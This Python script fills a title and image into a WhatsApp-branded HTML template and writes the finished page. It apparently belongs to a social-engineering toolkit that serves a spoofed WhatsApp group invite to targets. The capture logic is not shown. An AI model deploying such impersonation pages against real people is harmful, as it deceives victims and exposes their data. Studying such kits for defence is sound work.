#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = os.getenv('TITLE', 'Demo Group')
image = os.getenv('IMAGE', 'template/whatsapp/images/ZIvBTrQd9nP.png')

utils.print(f'{G}[+] {C}Group Title :{W} ' + title)
utils.print(f'{G}[+] {C}Group Image :{W} ' + image)

img_name = utils.downloadImageFromUrl(image, 'template/whatsapp/images/')
if img_name:
    img_name = img_name.split('/')[-1]
else:
    img_name = image.split('/')[-1]
    src_path = os.path.abspath(image)
    dst_path = os.path.abspath(f'template/whatsapp/images/{img_name}')
    if os.path.abspath(src_path) != os.path.abspath(dst_path):
        try:
            shutil.copyfile(image, dst_path)
        except Exception as e:
            utils.print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
            exit()

with open('template/whatsapp/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp/index.html', 'w') as new_index:
    new_index.write(code)